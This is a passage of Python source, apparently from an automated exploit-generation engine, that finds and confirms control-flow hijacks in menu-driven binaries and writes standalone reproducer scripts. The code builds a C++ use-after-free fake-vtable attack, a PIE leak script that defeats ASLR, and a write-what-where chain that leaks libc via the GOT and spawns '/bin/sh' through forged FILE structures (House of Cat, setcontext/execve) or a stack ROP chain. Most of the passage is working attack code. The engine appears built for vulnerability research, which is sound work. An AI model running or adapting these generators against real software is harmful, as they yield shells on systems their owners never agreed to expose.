    in the object: offset 0 -> chunk+8, and every following word -> win. A virtual call
    `mov rax,[obj]; call [rax+N]` then reads vtable=chunk+8 and calls *(chunk+8+N)=win for every
    small N -- no leak and no fixture gadget needed. The menu crawl is empty for a C++ target (its
    bwrap sandbox may lack libstdc++), so roles are SEARCHED, not read from the model: probe which
    option allocates (new), then permute the rest as (free, edit, show) and confirm the win
    breakpoint is hit AND a negative control (fake vtable -> a benign address) is NOT. Returns
    (seq, new_opt, free_opt, edit_opt, show_opt, chunk, size) or None. Non-PIE."""
    from ..dynamic import heap_discover
    if not _is_cpp_heap(target_bytes):
        return None
    alloc_info = heap_discover._libc_plt_pair(exe)
    if not alloc_info:
        return None
    win_name, win_addr = win

    # candidate roles: index-taking options (fall back to every option when the crawl learned none).
    cand = [o for o in opts if o in model and "idx" in model[o]] or list(opts)
    cand = [o for o in cand if o != "0"][:6]
    if len(cand) < 2:
        return None

    # THE MENU'S OWN WIDTH, not the target's. `shared_op_model` infers ONE width for the whole
    # program, and a C++ notebook commonly has both: the menu choice read with `scanf("%d")` or
    # `cin >>` (line-driven) and ONE data option reading a fixed block -- `read(0, obj, 48)`, which
    # is exactly the write this hijack needs. That single raw read made the crawl call the whole
    # target 48-byte fixed-width, so every option selector went out padded to 48 bytes, the menu
    # consumed one number and 46 bytes of filler desynced everything after it **[measured: the
    # model came back {1:[],2:[],3:[],4:[]} with width=48 and the hijack never fired]**. The
    # inference is not trusted alone: both encodings are tried, the detected one first.
    # ...and whether the option takes an INDEX at all. A notebook with a slot table reads one
    # (`delete(slot)`), a single-object demo reads none -- and an index sent to a program that
    # does not read it is left in the pipe, where the next option's `read(0, obj, 48)` swallows
    # it: the forged vtable pointer then lands two bytes into the object instead of at offset 0.
    # Four passes at most, detected-and-indexed first, and each is bounded by its own attempt cap.
    for sel_width in ([width] if width is None else [width, None]):
        for send_idx in (True, False):
            hit = _cpp_vtable_uaf_at(ctx, target, exe, functions, edges, win, cand, model,
                                     sel_width, workdir, capture, alloc_info, send_idx,
                                     pad_to=width)
            if hit:
                return hit
    return None


def _cpp_vtable_uaf_at(ctx, target, exe, functions, edges, win, cand, model, width, workdir,
                       capture, alloc_info, send_idx=True, pad_to=None):
    """One pass of `_cpp_vtable_uaf` with the option selectors encoded at `width`, sending an
    index scalar after each selector only when `send_idx`.

    `pad_to` is the FIXED-WIDTH read length the crawl detected, and the fake vtable is filled to
    it. The blob was sized from the ALLOCATION, which is a different number: `new Derived()` asks
    for 40 bytes and the option that overwrites it does `read(0, obj, 48)`, so a 40-byte payload
    leaves that read eight bytes short -- it swallows the detonating option's own bytes and then
    waits for more, and the capture comes back "no fatal signal" on a sequence that works by hand
    **[measured]**. A fixed-width field has to be filled to its width or every later operation
    desyncs; `menu._fill` says the same thing about size-prefixed strings."""
    from ..fuzz import menu
    from . import exploit
    win_name, win_addr = win

    def _op(opt, idx=0):                                  # select `opt`, supply index `idx`
        sel = menu._scalar(opt.encode(), width)
        return sel + menu._scalar(str(idx).encode(), width) if send_idx else sel

    # Identify the allocating option(s) by tracing each candidate's drive once (cached).
    allocs: dict = {}
    for opt in cand:
        if ctx.should_cancel():
            return None
        addr, size = _trace_alloc(ctx, exe, alloc_info, _op(opt, 0), width, workdir)
        if addr:
            allocs[opt] = (addr, size or 32)
    if not allocs:
        return None

    attempts = 0
    for new_opt, (chunk, size) in allocs.items():
        size = max(16, min(size, 4096)) & ~0x7            # object size: edit read() consumes exactly
        size = max(size, int(pad_to or 0))                # ...but a fixed-width read wants its WIDTH
        # fake vtable built inline in the reclaimed object: ptr at off 0 -> chunk+8, slots all win
        vtable = _p64(chunk + 8) + _p64(win_addr) * ((size - 8) // 8)
        vtable = vtable[:size].ljust(size, b"\x00")
        benign = _p64(chunk + 8) + _p64(win_addr ^ 0xFFFF) * ((size - 8) // 8)
        benign = benign[:size].ljust(size, b"\x00")
        others = [o for o in cand if o != new_opt]
        for free_opt in others:
            for edit_opt in others:
                if edit_opt == free_opt:
                    continue
                for show_opt in others:
                    if show_opt in (free_opt, edit_opt) or ctx.should_cancel() or attempts >= 200:
                        if attempts >= 200:
                            return None
                        continue
                    attempts += 1
                    body = (_op(new_opt, 0) + _op(free_opt, 0)
                            + _op(edit_opt, 0) + vtable + _op(show_opt, 0))
                    if not exploit.reached(capture(body, breakpoints=[win_addr]), win_addr):
                        continue
                    neg = (_op(new_opt, 0) + _op(free_opt, 0)
                           + _op(edit_opt, 0) + benign + _op(show_opt, 0))
                    if exploit.reached(capture(neg, breakpoints=[win_addr]), win_addr):
                        continue                          # reached without our vtable -> not ours
                    ctx.progress(msg=f"C++ UAF vtable hijack: new {new_opt}/free {free_opt}/edit "
                                     f"{edit_opt}/call {show_opt} -> fake vtable -> {win_name}")
                    return body, new_opt, free_opt, edit_opt, show_opt, chunk, size
    return None


def _attribution_proof(ctx, exe, seq, *, control=b"\n"):
    """Independently re-confirm a breakpoint-verified hijack by ATTRIBUTION: run the confirmed
    input under the write-attribution oracle and grade the win's output as coming from the
    target's OWN process subtree, present under the exploit and ABSENT under a benign control --
    a proof the old stdout-regex confirmation could not give (it credited any reflected string,
    or a helper that printed the banner itself). Best-effort: returns a proof dict or None, and
    never blocks the already breakpoint-confirmed L3."""
    try:
        from . import attribution as attr
        if exe is None or not attr.supported():
            return None
        helper = attr.materialize_helper()
        try:
            cap = attr.make_attributed_capture(ctx, helper, str(exe), "stdin", [], 8,
                                               sys.executable)
            res = cap(seq)
            if not isinstance(res, dict) or not res.get("ok"):
                return None
            ctrl = cap(control)
            ctrl = ctrl if isinstance(ctrl, dict) and ctrl.get("ok") else None
            lb = attr.lineage_bytes(res)
            cb = attr.lineage_bytes(ctrl) if ctrl else b""
            # a win banner / shell prompt (by shape) in an attributed write, absent under the
            # benign control -> the hijack ran, not a run-to-run artifact or a reflected string.
            win_lines = [ln for ln in lb.splitlines()
                         if _WIN_OUT.search(ln) and ln not in cb.splitlines()]
            g = attr.grade(res, win_tokens=win_lines, control=ctrl)
            return {"level": g["level"], "rank": g["rank"], "evidence": g["evidence"],
                    "attributed_bytes": g["attributed_bytes"]}
        finally:
            shutil.rmtree(helper.parent, ignore_errors=True)
    except Exception:
        observe.absorbed(_log, "answering None")
        return None


def _promote_lead(ctx, target, lead, *, level, bundle_sha, detail) -> None:
    """Carry the PoC back to the finding that LED to it.

    Every filer here writes a NEW finding for the exploit and leaves the lead where it was, so one
    defect reads as two unrelated rows: `Use-after-free -- corroborated` beside `Control-flow
    hijack (demonstrated)`, with nothing saying they are the same bug. Measured across 22 kept
    conformance stores, a chained lead stayed below poc-backed EVERY time -- 12/12 for
    `oob_index/CWE-129`, 5/5 for `heap_trace/CWE-416` -- which is a large part of what "a lot of
    potentials that dead end" actually is: the potential WAS carried, and its row was not updated.

    The lead keeps its own CWE, title and detector (it is still the defect that was found, and the
    detector that found it deserves the credit); what changes is that it becomes poc-backed, with
    the bundle as its proof and a line saying what the chain reached."""
    import json as _json

    from ...db.dao import FindingDAO
    try:
        FindingDAO(ctx.conn).upsert(target.id, target.case_id, {
            "cwe": lead.cwe, "title": lead.title, "severity": "critical",
            "detector": lead.detector, "state": "poc-backed", "confidence": 0.99,
            "dedup_key": lead.dedup_key,
            "evidence": [{"channel": "effects", "detail": _json.dumps([{
                "kind": "rce", "title": f"Chained to {level}", "status": "demonstrated",
                "detail": detail,
                "proof": {"type": "bundle", "sha": bundle_sha, "note": detail}}])}]})
    except Exception:                                    # noqa: BLE001 -- never fail the filing
        observe.absorbed(_log, "leaving the lead's state alone")


def _file_l3(ctx, target, lead, vclass, win_name, win_addr, seq, *, blame, writer, off, trig,
             exe=None):
    from ...db.dao import FindingDAO, PocDAO
    from . import bundle
    proof = _attribution_proof(ctx, exe, seq)
    input_sha = ctx.put_artifact("chain-exploit-input", data=seq)
    meta = {"target_sha256": target.sha256, "arch": target.arch, "level": "L3",
            "exploit": f"{vclass}->control-flow", "offset": off, "target": win_name,
            "tool_version": TOOL_VERSION,
            "proof_level": (proof or {}).get("level", "breakpoint_only")}
    data = bundle.build(ctx.content.path(target.sha256).read_bytes(),
                        seq, meta, b"", "stdin", [], None,
                        primitive={"type": vclass, "target": win_name, "offset": off,
                                   "confirmed": True})
    bundle_sha = ctx.put_artifact("poc-bundle", data=data, meta={"level": "L3", "verified": True})
    poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L3", verified=True,
                                     signal_name=None, input_sha=input_sha, bundle_sha=bundle_sha)
    trg = "program exit / normal use" if trig is None else f"menu option {trig}"
    eff = (f"working exploit ({vclass} -> control-flow hijack): {blame} to {win_name} "
           f"(0x{win_addr:x}); {trg} then calls it, arrival confirmed under the debugger with a "
           f"passing negative control.")
    if proof and proof["level"] in ("win_attributed", "code_exec_proven", "shell_proven"):
        eff += (f" Independently re-confirmed by attribution ({proof['level']}): the win output "
                "was emitted by the target's own process subtree, absent under a benign control.")
    attr_proof = {"attribution": proof} if proof else {}
    fd = FindingDAO(ctx.conn)
    cand = {
        "cwe": lead.cwe, "title": "Control-flow hijack (demonstrated): L3 working exploit",
        "severity": "critical", "detector": "chain_primitive", "state": "poc-backed",
        "confidence": 0.99, "authoritative": True, "title_only": True,
        "dedup_key": f"chain:{vclass}:{target.id}",
        "function_addr": None, "site_addr": None, "site_detail": win_name,
        "evidence": [{"channel": "effects", "detail": __import__("json").dumps([{
            "kind": "rce", "title": "Control-flow hijack", "status": "demonstrated", "detail": eff,
            "proof": {"type": "bundle", "sha": bundle_sha, "input_sha": input_sha,
                      "note": eff, **attr_proof}}])}]}
    fd.upsert(target.id, target.case_id, cand)
    fid = fd.id_for_dedup(target.id, cand["dedup_key"])
    if fid:
        PocDAO(ctx.conn).set_finding(poc_id, fid)
    _promote_lead(ctx, target, lead, level="L3", bundle_sha=bundle_sha, detail=eff)
    ctx.emit("chain.done", payload={"applicable": True, "confirmed": True, "vclass": vclass,
             "win": win_name, "offset": off, "writer": writer, "trigger": trig,
             "bundle": bundle_sha, "proof_level": (proof or {}).get("level", "breakpoint_only")})
    ctx.progress(pct=100, msg=f"L3 CONFIRMED: {vclass} -> {win_name} (option {writer} +{off})")
    return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
            "metrics": {"chained": True, "level": "L3", "vclass": vclass, "offset": off}}


def _pie_repro_script(win_name, win_vaddr, leak_opt, writer, off, trig) -> bytes:
    """A self-contained, stdlib-based reproducer: leak -> recover the PIE base from the target's own
    symbols -> overwrite the code pointer with base+win_vaddr -> trigger. The base recovery mirrors
    exploit.recover_pie_base (page-offset match, >=2 corroborating leaked slots), so the PoC is a
    genuine ASLR defeat, not a hardcoded address."""
    trig_send = "" if trig is None else f"send({trig!r}+'\\n')\n"
    return (
        "#!/usr/bin/env python3\n"
        "# PIE leak-then-chain reproducer (stdlib based). Usage: python3 exploit.py ./target.bin\n"
        "import subprocess, select, os, re, struct, sys, time, collections\n"
        f"WIN_VADDR={win_vaddr:#x}; LEAK={leak_opt!r}; WRITER={writer!r}; OFF={off}\n"
        "EXE=sys.argv[1] if len(sys.argv)>1 else './target.bin'\n"
        "def syms(path):\n"
        "  d=open(path,'rb').read(); a=collections.defaultdict(list)\n"
        "  is64=d[4]==2; e='<' if d[5]==1 else '>'\n"
        "  sh_off,=struct.unpack_from(e+'Q',d,0x28); shs,shn=struct.unpack_from(e+'HH',d,0x3a)\n"
        "  secs=[struct.unpack_from(e+'IIQQQQIIQQ',d,sh_off+i*shs) for i in range(shs and shn)]\n"
        "  for typ in (2,11):\n"
        "    for s in secs:\n"
        "      if s[1]!=typ or not s[9]: continue\n"
        "      st=secs[s[6]]; blob=d[st[4]:st[4]+st[5]]\n"
        "      for i in range(s[5]//s[9]):\n"
        "        o=s[4]+i*s[9]; info=d[o+4]; val,=struct.unpack_from(e+'Q',d,o+8)\n"
        "        t=info&0xf\n"
        "        if t in (1,2) and val: a[val&0xfff].append(val)\n"
        "    if a: break\n"
        "  return a\n"
        "def recover(vals, anchors):\n"
        "  sup=collections.defaultdict(set)\n"
        "  for v in vals:\n"
        "    if 0x1000<=v<=0x7fffffffffff:\n"
        "      for va in anchors.get(v&0xfff,()):\n"
        "        b=v-va\n"
        "        if b>0 and b&0xfff==0: sup[b].add(v)\n"
        "  best=max(sup, key=lambda b:len(sup[b]), default=None)\n"
        "  return best if best is not None and len(sup[best])>=2 else None\n"
        "p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
        "def drain(t=0.4):\n"
        "  b=b''; end=time.time()+t\n"
        "  while time.time()<end:\n"
        "    r,_,_=select.select([p.stdout],[],[],0.2)\n"
        "    if r:\n"
        "      c=os.read(p.stdout.fileno(),4096)\n"
        "      if not c: break\n"
        "      b+=c\n"
        "    elif p.poll() is not None: break\n"
        "  return b\n"
        "def send(s): p.stdin.write(s.encode() if isinstance(s,str) else s); p.stdin.flush()\n"
        "drain(); send(LEAK+'\\n'); out=drain()\n"
        "vals=[int(x,16) for x in re.findall(rb'0x[0-9a-fA-F]+',out)]\n"
        "base=recover(vals, syms(EXE))\n"
        "assert base, 'no base recovered from leak'\n"
        "send(WRITER+'\\n'); drain()\n"
        "send(b'A'*OFF+struct.pack('<Q',base+WIN_VADDR)); drain()\n"
        f"{trig_send}"
        "sys.stdout.write(drain().decode('latin-1','ignore'))\n"
    ).encode()


def _file_pie_l3(ctx, target, lead, vclass, win_name, *, win_vaddr, leak_opt, writer, off, trig):
    """File a confirmed PIE leak-chain as an L3 verified PoC (bundle = target + a runnable
    leak-then-chain reproducer)."""
    import json as _json

    from ...db.dao import FindingDAO, PocDAO
    from . import bundle
    script = _pie_repro_script(win_name, win_vaddr, leak_opt, writer, off, trig)
    input_sha = ctx.put_artifact("pie-chain-repro", data=script)
    meta = {"target_sha256": target.sha256, "arch": target.arch, "level": "L3",
            "exploit": f"{vclass}->control-flow (PIE, leak-relocated)", "target": win_name,
            "win_vaddr": hex(win_vaddr), "leak_option": leak_opt, "tool_version": TOOL_VERSION}
    data = bundle.build(ctx.content.path(target.sha256).read_bytes(), script, meta, b"",
                        "stdin", [], None,
                        primitive={"type": vclass, "target": win_name, "offset": off,
                                   "confirmed": True, "note": "PIE leak-relocated"})
    bundle_sha = ctx.put_artifact("poc-bundle", data=data, meta={"level": "L3", "verified": True})
    poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L3", verified=True,
                                     signal_name=None, input_sha=input_sha, bundle_sha=bundle_sha)
    trg = "program exit / normal use" if trig is None else f"menu option {trig}"
    eff = (f"working PIE exploit ({vclass} -> control-flow hijack): leaked a pointer via option "
           f"{leak_opt}, recovered the image base, then option {writer} overwrote an adjacent code "
           f"pointer at +{off} with base+{win_vaddr:#x} ({win_name}); {trg} ran it. Shown in "
           f"ONE process (a real ASLR defeat) and confirmed by the win's output under a passing "
           f"negative control (a corrupted address does not win).")
    fd = FindingDAO(ctx.conn)
    cand = {"cwe": lead.cwe, "title": "Control-flow hijack (demonstrated): L3 PIE leak-chain",
            "severity": "critical", "detector": "chain_primitive", "state": "poc-backed",
            "confidence": 0.99, "authoritative": True, "title_only": True,
            "dedup_key": f"chain:{vclass}:pie:{target.id}", "site_detail": win_name,
            "evidence": [{"channel": "effects", "detail": _json.dumps([{
                "kind": "rce", "title": "Control-flow hijack (PIE, ASLR defeated)",
                "status": "demonstrated", "detail": eff,
                "proof": {"type": "bundle", "sha": bundle_sha, "input_sha": input_sha,
                          "note": eff}}])}]}
    fd.upsert(target.id, target.case_id, cand)
    fid = fd.id_for_dedup(target.id, cand["dedup_key"])
    if fid:
        PocDAO(ctx.conn).set_finding(poc_id, fid)
    _promote_lead(ctx, target, lead, level="L3", bundle_sha=bundle_sha, detail=eff)
    ctx.emit("chain.done", payload={"applicable": True, "confirmed": True, "vclass": vclass,
             "win": win_name, "leak": leak_opt, "writer": writer, "offset": off, "trigger": trig,
             "pie": True, "bundle": bundle_sha})
    ctx.progress(pct=100, msg=f"L3 CONFIRMED (PIE): leak {leak_opt} -> base -> {win_name}")
    return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
            "metrics": {"chained": True, "level": "L3", "vclass": vclass, "pie": True, "off": off}}


def _stage_and_crawl(ctx, target, *, exe_dir=None):
    """Stage the target and share the menu op-model crawl, as the win-bearing path below does.
    Returns (workdir, exe, opts, model, width) -- the caller owns the workdir -- or None."""
    from ...db.dao import StringDAO
    from ..dynamic import sandbox
    from ..dynamic.heap_discover import shared_op_model
    from ..fuzz import menu
    workdir = Path(tempfile.mkdtemp(prefix="lykos-chain-"))
    sandbox.protect_dir(getattr(ctx.content, "root", None))
    try:
        exe = workdir / "target.bin"
        ctx.content.stage_target(target, exe.parent, exe.name)
        exe.chmod(0o755)
        strings = [x.value for x in StringDAO(ctx.conn).list_by_target(target.id)
                   if getattr(x, "value", None)]
        opts = menu.detect_menu(strings)
        width, model = shared_op_model(ctx, target, workdir, exe, opts)
        return workdir, exe, opts, model, width
    except Exception:                                    # noqa: BLE001
        observe.absorbed(_log, "staging for the write-what-where route")
        shutil.rmtree(workdir, ignore_errors=True)
        return None


# ------------------------------------------- write-what-where -> shell, with no win function at all
#: GOT slots worth READING for a libc leak, most-likely-resolved first. A lazily-bound slot still
#: holds a PLT stub until its function has been called, and `resolve_libc_base` rejects that (the
#: subtraction is not page aligned), so the order is "what a menu program has certainly called by
#: the time it prints its first prompt" -- the stream setup and the prompt itself.
_LEAK_SLOT_ORDER = ("setvbuf", "setbuf", "printf", "puts", "putchar", "fwrite", "fflush",
                    "__printf_chk", "write", "scanf", "__isoc99_scanf", "fgets", "read", "malloc",
                    "free", "memset", "strlen", "exit")


def _leak_slots(target_bytes) -> list:
    """[(got_address, libc symbol name)] to try the libc leak through, hot slots first."""
    from . import rop
    got = rop.got_entries(target_bytes)
    return sorted(((a, n) for n, a in got.items()),
                  key=lambda an: (_LEAK_SLOT_ORDER.index(an[1])
                                  if an[1] in _LEAK_SLOT_ORDER else 99, an[1]))


def _exit_sequences(opts, model, width) -> list:
    """Input that makes a menu program RETURN FROM MAIN, so exit() flushes the forged FILE.

    Two shapes, in order. An option the crawl learned NO fields for is the quit entry (every other
    option asked for something); and a non-numeric token makes the `scanf("%d", &op) != 1` guard
    that every one of these loops is written with fail, which is the same exit by another road --
    and the one that still works when the crawl learned nothing at all."""
    from ..fuzz import menu
    seqs = [menu._scalar(o.encode(), width) for o in opts if not model.get(o)][:2]
    return seqs + [b"q\n"]


def _www_shell(ctx, target, target_bytes, lead, vclass, *, exe, opts, model, width):
    """An unchecked indexed write + its paired read -> a spawned shell, with NO win function, no
    `system` in the PLT and ASLR left on (`leak.indexed_write_fsop`). This is the branch the engine
    did not have: `_oob_write_hijack` can only point a GOT slot at a win that exists, and without
    one the whole class fell back to an L2 recipe saying a leak-based chain is analyst work.

    The write option supplies the cells and the read option supplies both leaks (the libc base out
    of a GOT slot, the forged FILE's own `_wide_data`), so the exploit is in-band and in one
    process. Returns the filer's result dict, or None with the reason emitted."""
    from ..dynamic import oob_index
    from ..fuzz import menu
    from . import exploit
    from . import leak as _leak
    from .exploit_stage import _libc_bytes_for
    arrays = (oob_index._array_candidates(exploit.elf_objects_sized(target_bytes))
              or oob_index._array_candidates_symfree(Path(exe)))
    writers = [o for o in opts if o in model and "idx" in model[o] and len(model[o]) >= 2]
    readers = [o for o in opts if o in model and "idx" in model[o] and len(model[o]) == 1]
    libc_data = _libc_bytes_for(ctx, target) or b""
    if not (arrays and writers and readers and libc_data):
        ctx.emit("chain.www", payload={"ok": False, "arrays": len(arrays), "writers": len(writers),
                 "readers": len(readers), "libc": len(libc_data),
                 "note": "need a global array, a write option (index + value), a read option "
                         "(index) and the linked libc to forge a FILE"})
        return None
    slots = _leak_slots(target_bytes)
    exits = _exit_sequences(opts, model, width)
    # An array that can hold the fake wide jump table (its +0x68 word) first: the forgery then
    # stays inside memory the bug already reaches, instead of landing past the array in whatever
    # .bss follows it.
    arrays = sorted(arrays, key=lambda a: 0 if int(a.get("size") or 0) >= 0x70 else 1)
    for arr in arrays:
        base, stride = arr["addr"], arr.get("stride", 8) or 8
        for writer in writers:
            for reader in readers:
                if ctx.should_cancel():
                    return None

                def _w(addr, val, _o=writer, _b=base, _st=stride):
                    return _oob_write_seq(_o, model[_o], (addr - _b) // _st, val, None, model, width)

                def _r(addr, _o=reader, _b=base, _st=stride):
                    return (menu._scalar(_o.encode(), width)
                            + menu._fill(model[_o], idx=str((addr - _b) // _st).encode(),
                                         width=width))
                res = _leak.indexed_write_fsop(
                    Path(exe), Path(exe).parent, write_cell=_w, read_cell=_r,
                    libc_data=libc_data, leak_slots=slots, scratch=base,
                    scratch_size=int(arr.get("size") or 0), exit_seqs=exits,
                    target_bytes=target_bytes)
                if res.get("ok"):
                    ctx.progress(msg=f"indexed-write ({res.get('plan')}): option {writer} wrote "
                                     f"{len(res.get('cells') or ())} words over "
                                     f"{res['fp_name']} (libc {res['libc_base']:#x} leaked "
                                     f"through option {reader}) -> shell")
                    return _file_www_l3(ctx, target, lead, vclass, res, arr=arr, writer=writer,
                                        reader=reader, width=width, model=model)
                ctx.emit("chain.www", payload={"ok": False, "array": arr["name"], "writer": writer,
                         "reader": reader, "libc_base": res.get("libc_base"),
                         "plans_tried": res.get("plans_tried"), "note": res.get("reason", "")})
                if "did not read back" in (res.get("reason") or ""):
                    break                                # this writer cannot place a word; next one
    return None


def _www_repro_script(*, arr_name, arr_addr, stride, writer, reader, fields, rfields, width,
                      exits, plan="system", targets=None) -> bytes:
    """A self-contained reproducer. It redoes the LEAK (so it is not a hardcoded address): read a
    GOT slot through the unchecked index, subtract the symbol's offset in the libc the target
    links, keep the result only if it is page aligned -- then write the cells and exit.

    `plan` picks which FSOP payload to render, and only the offsets WITHIN libc are baked in
    (`targets`, which `leak.indexed_write_fsop` reports for the plan that worked): the base is
    still leaked at run time, exactly as the engine did it."""
    import json as _json

    from . import heap as _heap
    T = dict(targets or {})
    return ("#!/usr/bin/env python3\n"
            f"# write-what-where -> FSOP reproducer, {plan} plan (stdlib only).\n"
            "#   usage: python3 exploit.py ./target.bin\n"
            "import re, select, struct, subprocess, sys, time\n"
            f"ARR={arr_addr:#x}; STRIDE={stride}; WRITER={writer!r}; READER={reader!r}\n"
            f"PLAN={plan!r}\n"
            f"SCENTRY={int(T.get('setcontext') or 0):#x}; EXECVE={int(T.get('execve') or 0):#x}; "
            f"BINSH={int(T.get('binsh') or 0):#x}\n"
            f"GREGS={_json.dumps(T.get('fields') or {})}; RIP_AT={int(T.get('rip_at') or 0):#x}\n"
            f"ENVIRON={int(T.get('environ') or 0):#x}; POP_RDI={int(T.get('pop_rdi') or 0):#x}; "
            f"RETG={int(T.get('ret') or 0):#x}; ALIGN={bool(T.get('align'))!r}\n"
            f"LIST_ALL={int(T.get('list_all') or 0):#x}; FINISH={(T.get('plan') or 'system')!r}; "
            f"CAT={{'wide':{_heap.cat_offsets()['wide']:#x},'vt':{_heap.cat_offsets()['vt']:#x},"
            f"'lock':{_heap.cat_offsets()['lock']:#x},'size':{_heap.CAT_BLOB_MIN:#x}}}\n"
            f"WFIELDS={_json.dumps(fields)}; RFIELDS={_json.dumps(rfields)}; "
            f"WIDTH={width!r}; EXITS={_json.dumps([e.decode('latin1') for e in exits])}\n"
            "EXE=sys.argv[1] if len(sys.argv)>1 else './target.bin'\n"
            "F={'flags':0x00,'wptr':0x28,'wide':0xa0,'vtable':0xd8,'wd_buf':0x30,'wd_vt':0xe0,\n"
            "   'doalloc':0x68}\n"
            "def run(*a):\n"
            "    return subprocess.run(a, capture_output=True, text=True).stdout\n"
            "libc=re.search(r'=>\\s*(\\S+libc\\.so\\.6)', run('ldd', EXE)).group(1)\n"
            "S={}\n"
            "for m in re.finditer(r'^([0-9a-f]+)\\s+\\S+\\s+(\\S+)', run('nm','-D','--defined-only',libc), re.M):\n"
            "    S.setdefault(m.group(2).split('@')[0], int(m.group(1),16))\n"
            "GOT={m.group(2): int(m.group(1),16) for m in\n"
            "     re.finditer(r'^([0-9a-f]+)\\s+\\S+\\s+(\\S+?)(?:@\\S+)?\\s*$', run('objdump','-R',EXE), re.M)}\n"
            "p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE,\n"
            "                   stderr=subprocess.STDOUT,start_new_session=True)\n"
            "def cell(v):\n"
            "    s=str(v).encode()\n"
            "    return s.ljust(WIDTH, b'\\x00') if WIDTH else s+b'\\n'\n"
            "def op(seq, secs=0.3):\n"
            "    p.stdin.write(seq); p.stdin.flush()\n"
            "    out=b''; end=time.time()+secs\n"
            "    while time.time()<end:\n"
            "        if select.select([p.stdout],[],[],0.05)[0]:\n"
            "            b=p.stdout.read1(65536)\n"
            "            if not b: break\n"
            "            out+=b\n"
            "    return out\n"
            "def drive(fields, idx, val):\n"
            "    out=b''\n"
            "    for f in fields:\n"
            "        out+=cell(idx if f=='idx' else val)\n"
            "    return out\n"
            "def rd(addr):\n"
            "    out=op(cell(READER)+drive(RFIELDS,(addr-ARR)//STRIDE,0))\n"
            "    vals=[int(x)&(2**64-1) for x in re.findall(rb'-?\\d{2,}',out)]\n"
            "    return vals\n"
            "def wr(addr,val):\n"
            "    v=struct.unpack('<q',struct.pack('<Q',val&(2**64-1)))[0]\n"
            "    op(cell(WRITER)+drive(WFIELDS,(addr-ARR)//STRIDE,v))\n"
            "op(b'',0.3)\n"
            "base=None\n"
            "for name,slot in GOT.items():\n"
            "    if name not in S: continue\n"
            "    for v in rd(slot):\n"
            "        c=v-S[name]\n"
            "        if c>0 and c%0x1000==0: base=c; break\n"
            "    if base: break\n"
            "assert base, 'no GOT read resolved a page-aligned libc base'\n"
            "print('libc base %#x' % base)\n"
            "if PLAN!='stack':\n"
            "    fp=base+S['_IO_2_1_stderr_']\n"
            "    wide=next(v for v in rd(fp+F['wide']) if base<=v<base+0x600000)\n"
            "if PLAN=='stack':\n"
            "    # No FILE and no allocator: libc exports `environ`, whose VALUE is the envp array\n"
            "    # the kernel left on the stack, so one read turns the arbitrary read into a stack\n"
            "    # address. Main's saved return address is the first libc CODE pointer below it\n"
            "    # that is not inside __libc_start_main -- the two libc return addresses above\n"
            "    # main's both belong to frames that are never returned from (__libc_start_main\n"
            "    # calls __libc_start_call_main, which is noreturn), and main's own points into\n"
            "    # __libc_start_call_main, which no libc exports. Re-derived here, not baked in.\n"
            "    tx=re.search(r'\\.text\\s+\\S+\\s+([0-9a-f]+)\\s+\\S+\\s+([0-9a-f]+)',\n"
            "                 run('readelf','-SW',libc))\n"
            "    TLO,TSZ=int(tx.group(1),16),int(tx.group(2),16)\n"
            "    lsm=re.search(r'([0-9a-f]+)\\s+(\\d+)\\s+FUNC\\s+\\S+\\s+\\S+\\s+\\S+\\s+"
            "__libc_start_main', run('readelf','-sW',libc))\n"
            "    LSM=(int(lsm.group(1),16), int(lsm.group(2))) if lsm else (0,0)\n"
            "    stack=next(v for v in rd(base+ENVIRON) if 0x7f0000000000<v<0x800000000000)\n"
            "    print('environ -> stack %#x' % stack)\n"
            "    slot=None\n"
            "    for a in range((stack&~7), (stack&~7)-0x400, -8):\n"
            "        vs=rd(a)\n"
            "        if not vs: continue\n"
            "        v=vs[-1]\n"
            "        if not (base+TLO <= v < base+TLO+TSZ): continue\n"
            "        if base+LSM[0] <= v < base+LSM[0]+max(LSM[1],1): continue\n"
            "        slot=a; print(\"main's saved return %#x = libc+%#x\" % (a, v-base)); break\n"
            "    assert slot, 'no saved return address into libc below environ'\n"
            "    chain=([base+RETG] if ALIGN else [])+[base+POP_RDI, base+BINSH, base+S['system']]\n"
            "    for k,w in enumerate(chain): wr(slot+8*k, w)\n"
            "    assert [rd(slot+8*k)[-1] for k in range(len(chain))]==chain, 'chain did not land'\n"
            "elif PLAN=='cat':\n"
            "    # House of Cat: do not forge a FILE glibc owns. Build the whole FILE, its\n"
            "    # _IO_wide_data and its fake _wide_vtable inside the target's own array, then\n"
            "    # write ONE pointer -- _IO_list_all := &array. _mode is 1 so the flush test\n"
            "    # reads the WIDE write pointers, which are inside the blob.\n"
            "    blob=bytearray(CAT['size'])\n"
            "    def bw(o,v): blob[o:o+8]=struct.pack('<Q', v & (2**64-1))\n"
            "    if FINISH=='setcontext':\n"
            "        bw(0x00, 0x8000)                      # _IO_USER_LOCK: skip the lock\n"
            "        bw(GREGS['rdi'], base+BINSH); bw(GREGS['rsi'], 0); bw(GREGS['rdx'], 0)\n"
            "        bw(RIP_AT, base+EXECVE); bw(CAT['vt']+0x68, base+SCENTRY)\n"
            "    else:\n"
            "        blob[0x00:0x08]=b' /bin/sh'           # _flags doubles as the command\n"
            "        bw(0x88, ARR+CAT['lock']); bw(0x68, 0); bw(CAT['vt']+0x68, base+S['system'])\n"
            "    bw(0xa0, ARR+CAT['wide']); bw(0xc0, 1); bw(0xd8, base+S['_IO_wfile_jumps'])\n"
            "    bw(CAT['wide']+0x18, 0); bw(CAT['wide']+0x20, 1); bw(CAT['wide']+0x30, 0)\n"
            "    bw(CAT['wide']+0xe0, ARR+CAT['vt'])\n"
            "    for o in range(0, len(blob), 8):\n"
            "        v=struct.unpack('<Q', blob[o:o+8])[0]\n"
            "        if v: wr(ARR+o, v)\n"
            "    wr(base+LIST_ALL, ARR)\n"
            "elif PLAN=='setcontext':\n"
            "    # _IO_wdoallocbuf does `mov rdx,rdi` before the vtable call, so the forged FILE\n"
            "    # IS setcontext's ucontext. _IO_UNBUFFERED must go (wdoallocbuf opens\n"
            "    # `test BYTE PTR [rdi],2` and the unbuffered path never reaches the call);\n"
            "    # _IO_USER_LOCK goes in so _IO_flockfile never derefs _lock, which frees\n"
            "    # fp+0x88 == gregs[RDX] to be 0 -- hence execve with no chain and no gadget.\n"
